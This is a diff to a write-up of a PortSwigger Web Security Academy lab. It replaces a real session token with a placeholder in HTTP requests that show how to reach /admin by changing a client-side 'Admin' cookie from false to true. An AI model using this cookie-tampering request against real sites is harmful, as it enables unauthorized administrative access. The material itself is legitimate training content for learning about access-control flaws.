@@ -48,7 +48,7 @@ After logging in as a normal user and trying to access `/admin`.
 ```
 GET /admin HTTP/2
 Host: <lab-id>.web-security-academy.net
-Cookie: Admin=false; session=zuQ0kWx7hHFt8uoQd0pGrNToJxv9oySN
+Cookie: Admin=false; session=<session-cookie>
 ```
 
 ### Observation
@@ -72,7 +72,7 @@ The vulnerability is exploited by modifying the `Admin` cookie value.
 ```
 GET /admin HTTP/2
 Host: <lab-id>.web-security-academy.net
-Cookie: Admin=true; session=zuQ0kWx7hHFt8uoQd0pGrNToJxv9oySN
+Cookie: Admin=true; session=<session-cookie>
 ```
 
 ### Result
